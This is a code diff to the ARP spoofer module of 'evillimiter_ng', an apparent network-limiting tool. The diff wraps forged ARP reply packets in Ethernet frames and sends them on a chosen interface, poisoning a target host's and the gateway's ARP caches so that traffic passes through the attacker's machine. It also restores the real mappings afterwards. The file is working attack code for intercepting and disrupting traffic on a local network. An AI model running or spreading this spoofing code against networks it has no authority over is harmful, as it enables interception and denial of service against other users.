@@ -1,6 +1,6 @@
 import time
 import threading
-from scapy.all import ARP, send  # pylint: disable=no-name-in-module
+from scapy.all import Ether, ARP, sendp  # pylint: disable=no-name-in-module
 
 from evillimiter_ng.common.globals import BROADCAST
 
@@ -59,27 +59,29 @@ class ARPSpoofer:
 
     def _send_spoofed_packets(self, host):
         # 2 packets = 1 gateway packet, 1 host packet
+        # Wrapped in Ethernet frames to resolve Scapy warnings
         packets = [
-            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
+            Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
+            Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
         ]
 
-        [send(x, verbose=0) for x in packets]
+        [sendp(x, iface=self.interface, verbose=0) for x in packets]
 
     def _restore(self, host):
         """
         Remaps host and gateway to their actual addresses
         """
         # 2 packets = 1 gateway packet, 1 host packet
+        # Wrapped in Ethernet frames to resolve Scapy warnings
         packets = [
-            ARP(
+            Ether(dst=BROADCAST) / ARP(
                 op=2,
                 psrc=host.ip,
                 hwsrc=host.mac,
                 pdst=self.gateway_ip,
                 hwdst=BROADCAST,
             ),
-            ARP(
+            Ether(dst=BROADCAST) / ARP(
                 op=2,
                 psrc=self.gateway_ip,
                 hwsrc=self.gateway_mac,
@@ -88,4 +90,4 @@ class ARPSpoofer:
             ),
         ]
 
-        [send(x, verbose=0, count=3) for x in packets]
+        [sendp(x, iface=self.interface, verbose=0, count=3) for x in packets]
